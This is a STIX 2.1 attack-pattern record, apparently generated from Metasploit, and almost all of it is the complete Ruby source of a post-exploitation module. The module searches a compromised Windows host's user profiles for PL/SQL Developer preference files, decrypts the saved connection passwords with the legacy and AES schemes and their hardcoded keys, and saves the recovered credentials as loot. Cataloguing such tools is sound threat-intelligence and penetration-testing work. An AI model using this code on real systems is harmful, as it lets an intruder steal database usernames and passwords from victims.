{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9f58437d-fccf-4a21-923f-6b6f52154bb0",
    "created": "2024-08-14T16:33:08.252616Z",
    "modified": "2024-08-14T16:33:08.252619Z",
    "name": "Windows Gather PL/SQL Developer Connection Credentials",
    "description": " This module can decrypt the histories and connection credentials of PL/SQL Developer and passwords are available if the user chooses to remember.  'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/plsql_developer.rb",
            "external_id": "plsql_developer.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather PL/SQL Developer Connection Credentials',\n        'Description' => %q{\n          This module can decrypt the histories and connection credentials of PL/SQL Developer,\n          and passwords are available if the user chooses to remember.\n        },\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://adamcaudill.com/2016/02/02/plsql-developer-nonexistent-encryption/']\n        ],\n        'Author' => [\n          'Adam Caudill', # Discovery of legacy decryption algorithm\n          'Jemmy Wang' # Msf module & Discovery of AES decryption algorithm\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_ls\n              stdapi_fs_separator\n              stdapi_fs_stat\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('PLSQL_PATH', [ false, 'Specify the path of PL/SQL Developer']),\n      ]\n    )\n  end\n\n  def decrypt_str_legacy(str)\n    result = ''\n    key = str[0..3].to_i\n    for i in 1..(str.length / 4 - 1) do\n      n = str[(i * 4)..(i * 4 + 3)].to_i\n      result << (((n - 1000) ^ (key + i * 10)) >> 4).chr\n    end\n    return result\n  end\n\n  # New AES encryption algorithm introduced since PL/SQL Developer 15.0\n  def decrypt_str_aes(str)\n    bytes = Rex::Text.decode_base64(str)\n\n    cipher = OpenSSL::Cipher.new('aes-256-cfb8')\n    cipher.decrypt\n    hash = Digest::SHA1.digest('PL/SQL developer + Oracle 11.0.x')\n    cipher.key = hash + hash[0..11]\n    cipher.iv = bytes[0..7] + \"\\x00\" * 8\n\n    return cipher.update(bytes[8..]) + cipher.final\n  end\n\n  def decrypt_str(str)\n    # Empty string\n    if str == ''\n      return ''\n    end\n\n    if str.match(/^(\\d{4})+$/)\n      return decrypt_str_legacy(str) # Legacy encryption\n    elsif str.match(%r{^X\\.([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)$})\n      return decrypt_str_aes(str[2..]) # New AES encryption\n    end\n\n    # Shouldn't reach here\n    print_error(\"Unknown encryption format: #{str}\")\n    return '[Unknown]'\n  end\n\n  # Parse and separate the history string\n  def parse_history(str)\n    # @keys is defined in decrypt_pref, and this function is called by decrypt_pref after @keys is defined\n    result = Hash[@keys.map { |k| [k.to_sym, ''] }]\n    result[:Parent] = '-2'\n\n    if str.end_with?(' AS SYSDBA')\n      result[:ConnectAs] = 'SYSDBA'\n      str = str[0..-11]\n    elsif str.end_with?(' AS SYSOPER')\n      result[:ConnectAs] = 'SYSOPER'\n      str = str[0..-12]\n    else\n      result[:ConnectAs] = 'Normal'\n    end\n\n    # Database should be the last part after '@' sign\n    ind = str.rindex('@')\n    if ind.nil?\n      # Unexpected format, just use the whole string as DisplayName\n      result[:DisplayName] = str\n      return result\n    end\n\n    result[:Database] = str[(ind + 1)..]\n    str = str[0..(ind - 1)]\n\n    unless str.count('/') == 1\n      # Unexpected format, just use the whole string as DisplayName\n      result[:DisplayName] = str\n      return result\n    end\n\n    result[:Username] = str[0..(str.index('/') - 1)]\n    result[:Password] = str[(str.index('/') + 1)..]\n\n    return result\n  end\n\n  def decrypt_pref(file_name)\n    file_contents = read_file(file_name)\n    if file_contents.nil? || file_contents.empty?\n      print_status \"Skipping empty file: #{file_name}\"\n      return []\n    end\n\n    print_status(\"Decrypting #{file_name}\")\n    result = []\n\n    logon_history_section = false\n    connections_section = false\n\n    # Keys that we care about\n    @keys = %w[DisplayName Number Parent IsFolder Username Database ConnectAs Password]\n    # Initialize obj with empty values\n    obj = Hash[@keys.map { |k| [k.to_sym, ''] }]\n    # Folder parent objects\n    folders = {}\n\n    file_contents.split(\"\\n\").each do |line|\n      line.gsub!(/(\\n|\\r)/, '')\n\n      if line == '[LogonHistory]' && !(logon_history_section || connections_section)\n        logon_history_section = true\n        next\n      elsif line == '[Connections]' && !(logon_history_section || connections_section)\n        connections_section = true\n        next\n      elsif line == ''\n        logon_history_section = false\n        connections_section = false\n        next\n      end\n\n      if logon_history_section\n        # Contents in [LogonHistory] section are plain encrypted strings\n        # Calling the legacy decrypt function is intentional here\n        result << parse_history(decrypt_str_legacy(line))\n      elsif connections_section\n        # Contents in [Connections] section are key-value pairs\n        ind = line.index('=')\n        if ind.nil?\n          print_error(\"Invalid line: #{line}\")\n          next\n        end\n\n        key = line[0..(ind - 1)]\n        value = line[(ind + 1)..]\n\n        if key == 'Password'\n          obj[:Password] = decrypt_str(value)\n        elsif obj.key?(key.to_sym)\n          obj[key.to_sym] = value\n        end\n\n        # Color is the last field of a connection\n        if key == 'Color'\n          if obj[:IsFolder] != '1'\n            result << obj\n          else\n            folders[obj[:Number]] = obj\n          end\n\n          # Reset obj\n          obj = Hash[@keys.map { |k| [k.to_sym, ''] }]\n        end\n\n      end\n    end\n\n    # Build display name (Add parent folder name to the beginning of the display name)\n    result.each do |item|\n      pitem = item\n      while pitem[:Parent] != '-1' && pitem[:Parent] != '-2'\n        pitem = folders[pitem[:Parent]]\n        if pitem.nil?\n          print_error(\"Invalid parent: #{item[:Parent]}\")\n          break\n        end\n        item[:DisplayName] = pitem[:DisplayName] + '/' + item[:DisplayName]\n      end\n\n      if item[:Parent] == '-2'\n        item[:DisplayName] = '[LogonHistory]' + item[:DisplayName]\n      else\n        item[:DisplayName] = '[Connections]/' + item[:DisplayName]\n      end\n\n      # Remove fields used to build the display name\n      item.delete(:Parent)\n      item.delete(:Number)\n      item.delete(:IsFolder)\n\n      # Add file path to the final result\n      item[:FilePath] = file_name\n    end\n\n    return result\n  end\n\n  def enumerate_pref(plsql_path)\n    result = []\n    pref_dir = plsql_path + session.fs.file.separator + 'Preferences'\n    session.fs.dir.entries(pref_dir).each do |username|\n      udir = pref_dir + session.fs.file.separator + username\n      file_name = udir + session.fs.file.separator + 'user.prefs'\n\n      result << file_name if directory?(udir) && file?(file_name)\n    end\n\n    return result\n  end\n\n  def run\n    print_status(\"Gather PL/SQL Developer Histories and Credentials on #{sysinfo['Computer']}\")\n    profiles = grab_user_profiles\n    pref_paths = []\n\n    profiles.each do |user_profiles|\n      session.fs.dir.entries(user_profiles['AppData']).each do |dirname|\n        if dirname.start_with?('PLSQL Developer')\n          search_dir = user_profiles['AppData'] + session.fs.file.separator + dirname\n          pref_paths += enumerate_pref(search_dir)\n        end\n      end\n    end\n    pref_paths += enumerate_pref(datastore['PLSQL_PATH']) if datastore['PLSQL_PATH'].present?\n\n    result = []\n    pref_paths.uniq.each { |pref_path| result += decrypt_pref(pref_path) }\n\n    tbl = Rex::Text::Table.new(\n      'Header' => 'PL/SQL Developer Histories and Credentials',\n      'Columns' => ['DisplayName', 'Username', 'Database', 'ConnectAs', 'Password', 'FilePath']\n    )\n\n    result.each do |item|\n      tbl << item.values\n    end\n\n    print_line(tbl.to_s)\n    # Only save data to disk when there's something in the table\n    if tbl.rows.count > 0\n      path = store_loot('host.plsql_developer', 'text/plain', session, tbl, 'plsql_developer.txt', 'PL/SQL Developer Histories and Credentials')\n      print_good(\"Passwords stored in: #{path}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}